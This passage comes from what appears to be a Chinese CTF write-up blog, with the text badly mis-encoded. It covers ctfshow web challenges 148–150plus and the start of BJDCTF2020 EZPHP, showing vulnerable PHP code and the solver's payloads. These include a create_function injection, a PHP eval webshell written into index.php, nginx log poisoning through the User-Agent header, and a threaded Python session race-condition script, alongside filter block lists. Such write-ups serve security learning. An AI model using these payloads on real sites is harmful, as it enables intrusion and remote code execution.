</span><br><span class="line">&#125;</span><br><span class="line">å¾ˆçœ¼ç†Ÿã€‚ä»Šå¤©æ‰åšè¿‡çš„create_function()çš„é¢˜ç›®ã€‚</span><br><span class="line">ç°åœ¨é‡ç‚¹æ˜¯ctfshowçš„æ­£åˆ™ç»•è¿‡ã€‚</span><br><span class="line">fuzzä¸€ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨%<span class="number">5</span>cç»•è¿‡ã€‚</span><br><span class="line"><span class="comment">//payload:GETï¼š?show=&#125;system(&quot;cat flag.php&quot;);//</span></span><br><span class="line">  POST:ctfshow=%<span class="number">5</span>ccreate_function</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-149-æ¡ä»¶ç«äº‰"><a href="#web-149-æ¡ä»¶ç«äº‰" class="headerlink" title="web 149:æ¡ä»¶ç«äº‰"></a>web 149:æ¡ä»¶ç«äº‰</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">å¯ä»¥å‘ç°å†™å…¥çš„æ–‡ä»¶åä¸æ˜¯index.phpçš„æ—¶å€™ä¼šåˆ é™¤ã€‚</span><br><span class="line">é‚£æˆ‘ç›´æ¥å¾€index.phpå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ä¸å°±è¡Œäº†</span><br><span class="line"><span class="comment">//payload:GET:?ctf=index.php</span></span><br><span class="line"><span class="comment">//payload:POST:show=<span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-150-éé¢„æœŸæ—¥å¿—åŒ…å«ï¼Œé¢„æœŸåœ¨150plus"><a href="#web-150-éé¢„æœŸæ—¥å¿—åŒ…å«ï¼Œé¢„æœŸåœ¨150plus" class="headerlink" title="web 150:éé¢„æœŸæ—¥å¿—åŒ…å«ï¼Œé¢„æœŸåœ¨150plus"></a>web 150:éé¢„æœŸæ—¥å¿—åŒ…å«ï¼Œé¢„æœŸåœ¨150plus</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line">ä»£ç æŒºé•¿ã€‚</span><br><span class="line">å…ˆçœ‹å­˜åœ¨ä¸€ä¸ª<span class="variable">$key</span>çš„è¿‡æ»¤ã€‚ç„¶åä¸€ä¸ªpostä¼ å‚ï¼Œä¸€ä¸ªextract(<span class="variable">$_GET</span>)</span><br><span class="line">æœ€åå½“<span class="variable">$isVIP</span>=<span class="number">1</span>,ä¸”ctfä¸­æ— ï¼šæ—¶ï¼Œä¼šæ‰§è¡Œæ–‡ä»¶åŒ…å«ã€‚</span><br><span class="line">è¿™æ ·çš„è¯ä¼ªåè®®ä¸èƒ½ç”¨äº†ã€‚</span><br><span class="line">è¿™ä¸ª<span class="variable">$isVIP</span>å€’å¯æ§ã€‚å› ä¸ºextractçš„å­˜åœ¨ï¼Œåœ¨GETå¤„ä¼ å‚<span class="variable">$isVIP</span>=<span class="number">1</span>å³å¯ã€‚</span><br><span class="line">æ˜æ˜¾è¿™é‡ŒCTFSHOWç±»ä¸­çš„__destructä¼šè¿”å›flagã€‚</span><br><span class="line">é‚£ä¹ˆåˆ›å»ºè¿™ä¸ªç±»å³å¯ã€‚ä½†æ˜¯postå¦‚ä½•åˆ›å»ºä¸€ä¸ªç±»ï¼Œæˆ‘å€’æ˜¯ä¸å¤ªä¼šã€‚</span><br><span class="line">å› ä¸ºè¿™ä¸ª__CTFSHOW__è¿™ä¸ªç‚¹æˆ‘ç»•ä¸è¿‡ã€‚</span><br><span class="line">çœ‹äº†å¸ˆå‚…ä»¬çš„wpæ˜¯åˆ©ç”¨äº†æ—¥å¿—åŒ…å«ã€‚</span><br><span class="line"><span class="comment">//payload:</span></span><br><span class="line">GET:isVIP=<span class="number">1</span></span><br><span class="line">POST:ctf = /<span class="keyword">var</span>/log/nginx/access.log&amp;<span class="number">1</span>=system(<span class="string">&#x27;tac f*);</span></span><br><span class="line"><span class="string">UA=&lt;?php eval($_POST[1]);?&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h1 id="web-150plus-æ–‡ä»¶åŒ…å«æ¡ä»¶ç«äº‰"><a href="#web-150plus-æ–‡ä»¶åŒ…å«æ¡ä»¶ç«äº‰" class="headerlink" title="web 150plus:æ–‡ä»¶åŒ…å«æ¡ä»¶ç«äº‰"></a>web 150plus:æ–‡ä»¶åŒ…å«æ¡ä»¶ç«äº‰</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">è·Ÿä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä½†æ˜¯Banæ‰äº†ä¸Šä¸€é¢˜çš„æ—¥å¿—åŒ…å«ã€‚</span></span><br><span class="line"><span class="comment">æ ¹æ®hintçš„è¯´æ³•</span></span><br><span class="line"><span class="comment">..CTFSHOW..=__CTFSHOW__</span></span><br><span class="line"><span class="comment">..CTFSHOW..=phpinfo ä¼šæ‰§è¡Œphpinfoã€‚</span></span><br><span class="line"><span class="comment">ç¾¤ä¸»ç»™çš„è¯´æ³•æ˜¯autoload()ä¼šè‡ªåŠ¨åŠ è½½ç±»ã€‚é‚£æˆ‘ä»¬è¾“å…¥çš„phpinfoä¹Ÿä¼šè‡ªåŠ¨è¢«åŠ è½½?</span></span><br><span class="line"><span class="comment">åŸç†æˆ‘ä¸æ‡‚ã€‚åé¢æœ‰æœºä¼šå†è¯´ã€‚</span></span><br><span class="line"><span class="comment">çœ‹åˆ°äº†phpinfo.é‚£ä¹ˆå¯æ“ä½œæ€§å°±å¤ªå¼ºäº†ã€‚å…ˆæ‰¾flag</span></span><br><span class="line"><span class="comment">æ²¡æœ‰ã€‚å†æ‰¾sessionã€‚</span></span><br><span class="line"><span class="comment">å‘ç°seesion_auto_starat = off</span></span><br><span class="line"><span class="comment">session_upload_progress =o n</span></span><br><span class="line"><span class="comment">session_cleanup = on</span></span><br><span class="line"><span class="comment">é‚£ä¹ˆå¯ä»¥sessionç«äº‰äº†ã€‚</span></span><br><span class="line"><span class="comment">ä½†æ˜¯æ²¡æœ‰ç»™æˆ‘ä»¬è¿™ä¸ªsession.save</span></span><br><span class="line"><span class="comment">ç›´æ¥ç›²çŒœæµ‹/tmp/å³å¯</span></span><br><span class="line"><span class="comment">çœ‹äº†ç¾¤ä¸»çš„é¢„æœŸè§£ï¼Œè¡¨ç¤ºè¿™è°ä¼šå•Š?</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è„šæœ¬è´´å‡ºæ¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#  @Author: k1he</span></span><br><span class="line"><span class="comment">#  @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment">#  @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment">#  @Last Modified time: 2021-08-23 20:34:04</span></span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">sessid = <span class="string">&#x27;k1he&#x27;</span></span><br><span class="line">url = <span class="string">&#x27; http://522d8444-7909-4206-af01-bc1257b3c59d.challenge.ctf.show:8080/?isVIP=1&#x27;</span></span><br><span class="line"> </span><br><span class="line">def write(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="keyword">isSet</span>():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment"># åˆ›å»ºæ–‡ä»¶</span></span><br><span class="line">        response = session.post(                            <span class="comment"># postæ–‡ä»¶ä¸Šä¼ </span></span><br><span class="line">            url,                                            <span class="comment"># url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment"># è®¾ç½®cookieä¸ºæˆ‘ä»¬çš„sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;&quot;</span>&#125;,<span class="comment"># å†™é©¬æˆ–æ‰§è¡Œå†…å®¹</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment"># ä¸Šä¼ æ–‡çš„å…·ä½“å†…å®¹ï¼Œæ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹</span></span><br><span class="line">            )</span><br><span class="line"> </span><br><span class="line">def read(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="keyword">isSet</span>():</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&quot;/tmp/sess_&quot;</span>+sessid </span><br><span class="line">        &#125;</span><br><span class="line">                         <span class="comment"># åŒ…å«æˆ‘ä»¬çš„sessionè·¯å¾„</span></span><br><span class="line"> </span><br><span class="line">        response = session.post(url = url,data =data)           <span class="comment"># è¯»å–é¡µé¢</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> in response.text:                     <span class="comment"># è¿”å›é¡µé¢</span></span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment"># åŒçº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJCTF2020-EZPHP</title>
      <link href="/2021/09/14/BJDCTF2020-EZPHP/"/>
      <url>/2021/09/14/BJDCTF2020-EZPHP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    